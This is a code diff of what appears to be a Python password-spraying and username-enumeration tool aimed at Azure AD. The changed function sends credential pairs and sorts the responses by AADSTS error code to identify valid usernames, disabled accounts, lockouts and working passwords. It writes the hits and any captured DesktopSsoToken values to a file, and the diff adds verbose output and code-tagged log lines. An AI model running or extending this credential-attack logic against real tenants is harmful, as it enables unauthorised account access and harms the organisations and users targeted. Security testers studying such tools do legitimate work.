@@ -171,17 +171,20 @@ def checkURL(userline):
         time.sleep(3)
 
     xmlresponse = str(r.content)
+    if verbose:
+        print(xmlresponse)
+
     credentialset = username + ":" + password
 
 
     # check our resopnse for error/response codes
     if "AADSTS50034" in  xmlresponse:
-        print("[-] Username not found:{}".format(credentialset))
+        print("[-] Username not found:AADSTS50034:{}".format(credentialset))
     elif "AADSTS50126" in xmlresponse:
-        print("[+] VALID USERNAME, invalid password :{}".format(credentialset))
+        print("[+] VALID USERNAME:AADSTS50126:{}".format(credentialset))
         writeLock.acquire()
         with open(outputfile,"a") as outfilestream:
-            outfilestream.write("[+] FOUND VALID USERNAME:{}\n".format(credentialset))
+            outfilestream.write("[+] VALID USERNAME:AADSTS50126:{}\n".format(credentialset))
         writeLock.release()
     elif "DesktopSsoToken" in xmlresponse:
         print("[+] VALID CREDS! :{}".format(credentialset))
@@ -194,29 +197,31 @@ def checkURL(userline):
             outfilestream.write("[+] TOKEN FOUND :{}:{}\n".format(username, result))
         writeLock.release()
     elif "AADSTS50056" in xmlresponse:
-        print("[+] VALID USERNAME, no password in AzureAD:{}".format(credentialset))
+        print("[+] VALID USERNAME:AADSTS50056:{}".format(credentialset))
         writeLock.acquire()
         with open(outputfile,"a") as outfilestream:
-            outfilestream.write("[+] FOUND USERNAME, no password in AzureAD :{}\n".format(credentialset))
+            outfilestream.write("[+] VALID USERNAME:AADSTS50056:{}\n".format(credentialset))
         writeLock.release()
     elif "AADSTS80014" in xmlresponse:
-        print("[+] VALID USERNAME, max pass-through authentication time exceeded :{}".format(credentialset))
+        print("[+] VALID USERNAME:AADSTS80014:{}".format(credentialset))
         writeLock.acquire()
         with open(outputfile,"a") as outfilestream:
-            outfilestream.write("[+] FOUND USERNAME, max pass-through authentication time exceeded :{}\n".format(credentialset))
+            outfilestream.write("[+] VALID USERNAME:AADSTS80014:{}\n".format(credentialset))
         writeLock.release()
     elif "AADSTS50053" in xmlresponse:
         print("[?] SMART LOCKOUT DETECTED - Unable to enumerate:{}".format(credentialset))
     elif "AADSTS50057" in xmlresponse:
-        print("[?] DISABLED ACCOUNT:{}".format(credentialset))
+        print("[-] DISABLED ACCOUNT:AADSTS50057:{}".format(credentialset))
     elif "AADSTS81016" in xmlresponse:
-        print("[?] Invalid STS - May not have DesktopSSO or Directory Sync Enabled:{}".format(credentialset))
-        print("Exiting now.")
-        exit_request = True
-        sys.exit()
+        print("[+] VALID USERNAME:AADSTS81016:{}".format(credentialset))
+        writeLock.acquire()
+        with open(outputfile,"a") as outfilestream:
+            outfilestream.write("[+] VALID USERNAME:AADSTS81016:{}\n".format(credentialset))
+        writeLock.release()
     else:
         print("[!] I have NO clue what just happened. sorry. ", credentialset)
         print(xmlresponse)
+        print("")
 
 
 
